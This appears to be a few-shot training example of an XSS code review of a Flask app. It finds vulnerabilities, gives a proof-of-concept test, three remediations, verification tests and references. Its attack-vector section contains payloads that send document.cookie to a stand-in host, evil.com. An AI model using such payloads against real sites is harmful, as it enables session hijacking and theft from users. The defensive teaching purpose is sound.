# Few-Shot Example: XSS Vulnerability Code Review

**Domain:** security
**Skill Level:** Intermediate
**Pattern:** Identify → PoC → Fix → Verify

---

## User Query

Review this Flask endpoint for XSS vulnerabilities:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = database.search(query)

    html = f'''
    <html>
    <head><title>Search Results</title></head>
    <body>
        <h1>Results for: {query}</h1>
        <ul>
            {"".join(f"<li>{r['title']}</li>" for r in results)}
        </ul>
        <p>Found {len(results)} results</p>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/profile/<username>')
def profile(username):
    return f"<h1>Welcome, {username}!</h1>"
```

---

## Exemplary Response

### 1. Vulnerability Identification

| Location | Type | CWE | Severity |
|----------|------|-----|----------|
| Line 12: `{query}` | Reflected XSS | CWE-79 | High |
| Line 14: `{r['title']}` | Stored XSS | CWE-79 | Critical |
| Line 21: `{username}` | Reflected XSS | CWE-79 | High |

### 2. Attack Vector Analysis

**Reflected XSS via search query:**
```
GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Result:** User's session cookie sent to attacker's server.

**Stored XSS via database content:**
If an attacker can insert a title like:
```html
<img src=x onerror="fetch('https://evil.com/'+document.cookie)">
```
Every user viewing search results will be compromised.

**Path-based XSS:**
```
GET /profile/<script>alert(document.domain)</script>
```

### 3. Proof of Concept

```python
# test_xss.py
import requests

TARGET = "http://localhost:5000"

def test_reflected_xss():
    """Test reflected XSS in search endpoint."""
    payload = "<script>alert('XSS')</script>"
    response = requests.get(f"{TARGET}/search", params={"q": payload})

    # If payload appears unescaped, XSS is present
    assert payload in response.text, "Reflected XSS confirmed"
    print(f"[VULN] Reflected XSS: payload rendered as-is")

def test_profile_xss():
    """Test XSS in profile endpoint."""
    payload = "<img src=x onerror=alert(1)>"
    response = requests.get(f"{TARGET}/profile/{payload}")

    assert payload in response.text, "Profile XSS confirmed"
    print(f"[VULN] Profile XSS: payload rendered as-is")

if __name__ == "__main__":
    test_reflected_xss()
    test_profile_xss()
```

### 4. Remediation Options

#### Option 1: Jinja2 Auto-escaping (Recommended)

```python
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = database.search(query)

    # Use template file with auto-escaping
    return render_template('search.html', query=query, results=results)

@app.route('/profile/<username>')
def profile(username):
    # escape() converts special chars to HTML entities
    return f"<h1>Welcome, {escape(username)}!</h1>"
```

**templates/search.html:**
```html
<!DOCTYPE html>
<html>
<head><title>Search Results</title></head>
<body>
    <!-- Jinja2 auto-escapes {{ }} by default -->
    <h1>Results for: {{ query }}</h1>
    <ul>
        {% for r in results %}
            <li>{{ r.title }}</li>
        {% endfor %}
    </ul>
    <p>Found {{ results|length }} results</p>
</body>
</html>
```

**Pros:**
- Automatic escaping by default
- Clear separation of logic and presentation
- Works for all contexts automatically

**Cons:**
- Requires template file management

#### Option 2: Manual Escaping

```python
from markupsafe import escape, Markup

@app.route('/search')
def search():
    query = escape(request.args.get('q', ''))
    results = database.search(request.args.get('q', ''))

    # Manually escape each value
    safe_results = [escape(r['title']) for r in results]

    html = Markup(f'''
    <html>
    <head><title>Search Results</title></head>
    <body>
        <h1>Results for: {query}</h1>
        <ul>
            {"".join(f"<li>{r}</li>" for r in safe_results)}
        </ul>
        <p>Found {len(results)} results</p>
    </body>
    </html>
    ''')
    return html
```

**Pros:**
- Quick fix for existing code
- No template restructuring needed

**Cons:**
- Easy to miss spots (error-prone)
- Must remember to escape every insertion

#### Option 3: Content Security Policy (Defense in Depth)

```python
@app.after_request
def add_security_headers(response):
    # Prevent inline script execution even if XSS exists
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "frame-ancestors 'none'"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response
```

**Pros:**
- Defense in depth layer
- Mitigates impact even if XSS bypass exists

**Cons:**
- Not a fix, just mitigation
- May break legitimate functionality

### 5. Verification

```python
# test_xss_fixed.py
import requests
from html import escape as html_escape

TARGET = "http://localhost:5000"

def test_reflected_xss_fixed():
    """Verify reflected XSS is fixed."""
    payload = "<script>alert('XSS')</script>"
    expected_escaped = "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"

    response = requests.get(f"{TARGET}/search", params={"q": payload})

    # Payload should be escaped, not raw
    assert payload not in response.text, "XSS still present!"
    assert expected_escaped in response.text or html_escape(payload) in response.text
    print("[PASS] Reflected XSS is properly escaped")

def test_csp_header():
    """Verify CSP header is present."""
    response = requests.get(f"{TARGET}/search", params={"q": "test"})

    csp = response.headers.get('Content-Security-Policy', '')
    assert "script-src 'self'" in csp, "CSP not configured"
    print("[PASS] CSP header is properly configured")

if __name__ == "__main__":
    test_reflected_xss_fixed()
    test_csp_header()
```

### 6. Why This Fix Works

**HTML Entity Encoding** converts special characters to safe representations:

| Character | Encoded | Purpose |
|-----------|---------|---------|
| `<` | `&lt;` | Prevents tag opening |
| `>` | `&gt;` | Prevents tag closing |
| `"` | `&quot;` | Prevents attribute escape |
| `'` | `&#39;` | Prevents attribute escape |
| `&` | `&amp;` | Prevents entity injection |

When browser renders `&lt;script&gt;`, it displays as text `<script>` instead of executing JavaScript.

**CSP** adds defense in depth:
- `script-src 'self'` blocks inline scripts even if attacker injects `<script>` tags
- Browser refuses to execute non-whitelisted scripts

### 7. References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [Flask Security Considerations](https://flask.palletsprojects.com/en/latest/security/)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

## Why This Is A Good Example

- Identifies multiple XSS instances (reflected, stored, URL-based)
- Provides working PoC to demonstrate risk
- Offers three remediation approaches with trade-offs
- Includes verification tests
- Explains WHY the fix works (encoding mechanism)
- References authoritative sources

---

## Key Patterns

1. **Multiple Vulnerability Identification** - Don't stop at first finding
2. **Working PoC** - Demonstrate actual exploitability
3. **Layered Defense** - Escaping + CSP + Headers
4. **Verification Tests** - Prove the fix works

---

**Tags:** #security #xss #cwe-79 #flask #web #code-review
**Version:** 1.0.0
**Last Updated:** 2026-01-23
